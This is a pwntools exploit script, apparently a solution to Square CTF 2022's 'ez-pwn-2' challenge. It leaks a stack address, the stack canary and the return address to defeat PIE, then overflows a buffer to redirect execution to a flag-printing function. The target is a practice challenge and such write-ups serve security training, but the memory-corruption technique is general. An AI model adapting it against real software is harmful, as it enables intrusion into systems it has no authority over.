#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=chals.2022.squarectf.com' '--port=4101' ez-pwn-2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ez-pwn-2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'chals.2022.squarectf.com'
port = int(args.PORT or 4101)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# get buffer add
io.recvuntil(b'here: ')
leak = int(io.recvline().strip(), 16)

info(f'leaked stack {hex(leak)}')

# get canary value
canary_add = leak + 24
io.sendafter(b'bytes:', p64(canary_add, endian='little').hex())
io.recvuntil(b':\n')

canary = int(io.recvline(), 16)
canary = (u64(p64(canary), endianness='big'))
info(f'{hex(canary)=}')



# get return_add value
return_addr = leak + 24 + 8 + 8
io.sendafter(b'bytes:', p64(return_addr, endian='little').hex())
io.recvuntil(b':\n')

ret = int(io.recvline(), 16)
ret = (u64(p64(ret), endianness='big'))
info(f'{hex(ret)=}')

exe.address = ret - 0xa21

payload = flat(
    p64(canary_add, endian='little').hex(),
    b'A'*8,
    p64(canary),
    b'B'*8,
    p64(exe.sym.this_function_literally_prints_the_flag),
)

io.sendafter(b'bytes:', payload)


io.interactive()

